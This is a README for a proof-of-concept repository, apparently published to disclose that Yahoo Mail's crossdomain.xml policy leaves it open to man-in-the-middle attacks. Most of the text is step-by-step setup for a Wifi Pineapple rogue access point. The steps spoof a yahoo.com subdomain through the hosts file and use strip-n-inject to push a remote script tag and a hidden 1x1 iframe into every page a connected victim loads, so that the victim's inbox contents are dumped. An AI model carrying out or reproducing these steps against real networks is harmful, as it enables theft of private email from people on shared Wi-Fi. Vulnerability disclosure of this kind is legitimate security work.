## YMail-Pineapple

A couple years back [I mentioned](http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/) that Yahoo! Mail is vulnerable to active MITM attacks due to problems with its `crossdomain.xml` policy. Specifically, Yahoo Mail policy is

```xml
<cross-domain-policy>
    <allow-access-from domain="*.yahoo.com" secure="false"/>
</cross-domain-policy>
```

[Per Adobe](https://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html#articlecontentAdobe_numberedheader_0) "using \[secure=\]false in an HTTPS policy file is not recommended because this compromises the security offered by HTTPS."

Note that the ability to give insecure documents privileged access to secure resources isn't unique to Flash's crossdomain policies. [You can make the same mistake with CORS headers (see "Breaking HTTPS".)](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)

Anywho, since Yahoo still hasn't fixed this I figured I'd demonstrate that this isn't just a handwavey warning, and that this makes Yahoo Mail trivially MITMable.

Putting aside aside my concerns about the security of its code, I own a Wifi Pineapple Mark V so the instructions assume you're using one as well. All of this could be reasonably adapted to any other router that can run vanilla OpenWRT.

## Configuring

* Make sure your Pineapple is connected to the internet via ethernet or a second wifi radio
* Install the [strip-n-inject infusion](https://forums.hak5.org/index.php?/topic/30673-support-strip-n-inject/)
** I needed to run `mkdir -p /sd/tmp/` to get `strip-n-inject` to start but YMMV
* SSH into your Pineapple and add `127.0.0.1 spoof.yahoo.com` to `/etc/hosts` so it will read from our internal webserver
* `rsync` the contents of this repo to `/www/` on your Pineapple
* Configure `strip-n-inject` to inject the following onto each page:

```html
<script src="http://spoof.yahoo.com/receiver.js"></script>
<iframe width="1" height="1" src="http://spoof.yahoo.com/grabberFrame.html"></iframe>
```

* If you don't want to dump the inbox contents to the current page, edit `grabber.js` to do something other than `postMessage()` and remove the `receiver.js` line from `strip-n-inject`'s config


## Running

At this point you should be ready to test. Make sure you're logged in on YMail and navigate to http://www.cnn.com/ while connected to the Pineapple's public interface. You should see a box like

![Emails dumped into www.cnn.com](/screenshot.png)

If you don't, make sure `strip-n-inject` is configured correctly and check your browser console.

## Fixing

This will no longer work once Yahoo removes `secure="false"` from their `crossdomain.xml`s.
